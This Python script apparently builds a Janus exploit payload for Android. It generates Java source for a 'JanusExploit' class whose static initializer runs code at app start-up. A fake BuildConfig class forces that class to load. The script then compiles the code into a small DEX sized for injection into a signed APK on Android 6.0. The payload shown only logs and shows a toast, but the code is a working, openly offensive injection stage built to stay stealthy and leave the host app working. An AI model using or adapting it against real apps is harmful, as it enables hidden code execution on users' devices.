#!/usr/bin/env python3
# create_stealthy_dex.py - Create a minimal malicious DEX that doesn't break the app
import subprocess, sys, os

if len(sys.argv) != 3:
    print("Usage: create_stealthy_dex.py <package_name> <output.dex>")
    print("Example: create_stealthy_dex.py com.noexpoapp stealthy.dex")
    sys.exit(1)

package_name, output_dex = sys.argv[1:]

print(f"🎯 Creating stealthy malicious DEX for package: {package_name}")

# Create a minimal malicious class that doesn't replace MainApplication
# Instead, it creates a separate class that will be loaded by the static initializer
java_code = f'''package {package_name};

public class JanusExploit {{
    
    static {{
        try {{
            // Log the exploit success
            System.out.println("🚨🚨🚨 JANUS STATIC BLOCK EXECUTED! 🚨🚨🚨");
            android.util.Log.e("JANUS", "🚨🚨🚨 STATIC BLOCK: JanusExploit class loaded! 🚨🚨🚨");
            
            // Show exploit proof without breaking the app
            showStealthyExploit();
            
        }} catch (Exception e) {{
            android.util.Log.e("JANUS", "Static block error: " + e.getMessage());
        }}
    }}
    
    private static void showStealthyExploit() {{
        try {{
            android.util.Log.e("JANUS", "💥 JANUS EXPLOIT: Minimal payload executing...");
            
            // Show Toast in background thread to avoid blocking
            new Thread(new Runnable() {{
                public void run() {{
                    try {{
                        Thread.sleep(3000); // Wait for app to fully load
                        
                        // Get application context safely
                        Class<?> activityThread = Class.forName("android.app.ActivityThread");
                        Object currentThread = activityThread.getMethod("currentActivityThread").invoke(null);
                        Object application = activityThread.getMethod("getApplication").invoke(currentThread);
                        
                        if (application != null) {{
                            android.content.Context context = (android.content.Context) application;
                            
                            // Show Toast on UI thread
                            android.os.Handler mainHandler = new android.os.Handler(android.os.Looper.getMainLooper());
                            mainHandler.post(new Runnable() {{
                                public void run() {{
                                    try {{
                                        android.widget.Toast.makeText(context, "🚨 JANUS EXPLOITED! 🚨", android.widget.Toast.LENGTH_LONG).show();
                                        android.util.Log.e("JANUS", "✅ Exploit Toast displayed successfully!");
                                    }} catch (Exception e) {{
                                        android.util.Log.e("JANUS", "Toast error: " + e.getMessage());
                                    }}
                                }}
                            }});
                        }}
                    }} catch (Exception e) {{
                        android.util.Log.e("JANUS", "Background exploit error: " + e.getMessage());
                    }}
                }}
            }}).start();
            
        }} catch (Exception e) {{
            android.util.Log.e("JANUS", "Exploit initialization error: " + e.getMessage());
        }}
    }}
}}

// Trigger class loading through a fake BuildConfig class
// This ensures our exploit runs when the app starts
class BuildConfig {{
    static {{
        // Force JanusExploit class to load
        try {{
            Class.forName("{package_name}.JanusExploit");
        }} catch (Exception e) {{
            // Silent
        }}
    }}
}}'''

# Write Java source
java_dir = package_name.replace('.', '/')
os.makedirs(java_dir, exist_ok=True)

exploit_file = f"{java_dir}/JanusExploit.java"
with open(exploit_file, 'w') as f:
    f.write(java_code)

print(f"📝 Created: {exploit_file}")

# Find Android SDK
android_sdk = os.environ.get('ANDROID_SDK_ROOT', '/opt/android-sdk')
if not os.path.exists(android_sdk):
    android_sdk = '/Users/nictjh/Library/Android/sdk'  # macOS default

# Compile to .class
print("🔧 Compiling Java source...")
result = subprocess.run([
    'javac', '-cp', f'{android_sdk}/platforms/android-24/android.jar',
    '-d', '.', exploit_file
], capture_output=True, text=True)

if result.returncode != 0:
    print("❌ Compilation failed:")
    print(result.stderr)
    sys.exit(1)

# Find d8 tool
d8_path = None
possible_paths = [
    f"{android_sdk}/build-tools/36.0.0/d8",
    f"{android_sdk}/build-tools/35.0.0/d8", 
    f"{android_sdk}/cmdline-tools/latest/bin/d8"
]

for path in possible_paths:
    if os.path.exists(path):
        d8_path = path
        break

if not d8_path:
    sys.exit("❌ d8 tool not found in Android SDK")

# Convert to DEX using d8
print("📦 Creating DEX with d8...")

# Find all generated class files (including anonymous inner classes)
import glob
class_files = glob.glob(f"{java_dir}/*.class")
print(f"🔍 Found class files: {class_files}")

if not class_files:
    print("❌ No class files found")
    sys.exit(1)

# d8 outputs to directory, so create temp dir
temp_dir = f"temp_dex_{os.getpid()}"
os.makedirs(temp_dir, exist_ok=True)

result = subprocess.run([
    d8_path, '--output', temp_dir
] + class_files, capture_output=True, text=True)

if result.returncode != 0:
    print("❌ DEX creation failed:")
    print(result.stderr)
    import shutil
    shutil.rmtree(temp_dir, ignore_errors=True)
    sys.exit(1)

# Move classes.dex to desired output name
classes_dex = os.path.join(temp_dir, 'classes.dex')
if os.path.exists(classes_dex):
    import shutil
    shutil.move(classes_dex, output_dex)
    shutil.rmtree(temp_dir, ignore_errors=True)
else:
    print("❌ classes.dex not found in output")
    shutil.rmtree(temp_dir, ignore_errors=True)
    sys.exit(1)

# Check DEX size
dex_size = os.path.getsize(output_dex)
print(f"✅ Created: {output_dex} ({dex_size} bytes)")

if dex_size > 4096:
    print(f"⚠️  Warning: DEX is {dex_size} bytes (max 4096 for Android 6.0)")
    print("💡 Consider reducing payload size")
else:
    print(f"✅ DEX size OK for Android 6.0 Janus ({4096 - dex_size} bytes available)")

# Cleanup
import shutil
shutil.rmtree(package_name.split('.')[0])

print(f"\n🎯 Usage:")
print(f"python3 make_proper_janus.py <original.apk> {output_dex} <janus.apk>")
print(f"\n💡 This DEX contains minimal exploit classes that shouldn't break the app!")
